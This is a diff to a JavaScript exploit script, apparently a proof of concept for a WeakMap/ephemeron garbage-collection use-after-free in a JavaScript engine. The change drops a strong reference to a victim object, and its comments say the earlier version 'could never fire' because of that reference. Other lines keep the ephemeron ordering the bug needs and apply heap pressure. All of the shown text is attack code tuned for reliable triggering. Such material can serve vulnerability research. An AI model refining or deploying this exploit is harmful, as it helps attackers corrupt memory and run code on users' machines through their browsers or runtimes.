@@ -92,8 +92,9 @@ function setUpWeakMap(map) {
   map7.set(k8, map8);
   map7.set(k7, k8);
   map8.set(k8, k9);
-  // keep a strong handle so we can report the object's shape
-  return { v9: v9, k8: k8 };
+  // NOTE: nothing is returned. Keeping even one strong reference to v9 makes it
+  // reachable and the use-after-free impossible — an earlier revision returned
+  // {v9, k8} and could never fire for that reason alone.
 }
 
 var trials = 0;
@@ -105,7 +106,7 @@ for (var r = 0; r < rounds; r++) {
     // Fresh map each round: the RCA reuses one global, but that accumulates
     // entries and changes the ephemeron ordering the bug depends on.
     map1 = new WeakMap();
-    var refs = setUpWeakMap(map1);
+    setUpWeakMap(map1);
     var blockCount = forceOnHeapPressure(400, 500);
     if (r === 0) { print('[+]onheap blocks=' + blockCount); }
     let hiddenKey = getHiddenKey(map1, level, initKey);
